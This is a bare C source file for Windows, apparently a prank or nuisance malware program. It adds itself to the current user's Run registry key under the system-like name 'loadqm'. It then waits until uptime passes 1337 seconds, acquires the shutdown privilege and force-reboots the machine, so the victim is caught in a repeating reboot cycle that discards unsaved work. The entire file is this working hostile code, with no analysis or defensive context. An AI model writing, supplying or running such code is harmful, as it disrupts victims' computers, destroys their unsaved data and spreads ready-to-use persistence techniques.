#include <windows.h>

int RebootMachine() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);

return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	HKEY hKey = 0;
	int x = 0;
	int skip = 0;
	char watermark[] = "zero";
	if (!strcmp(lpCmdLine, "/skip")) skip=1;
	char cmdline[MAX_PATH];
	GetFullPathName("loadqm.exe", MAX_PATH, cmdline, 0);
	RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegSetValueEx(hKey, "loadqm", 0, REG_SZ, (const BYTE *)cmdline, strlen(cmdline));
	RegCloseKey(hKey);
	
	loop:
	if (!skip) x = GetTickCount()/1000;
	if (x>=1337) {
		RebootMachine();
		goto end;
	}
	Sleep(1);
	goto loop;

end:
return 0;
}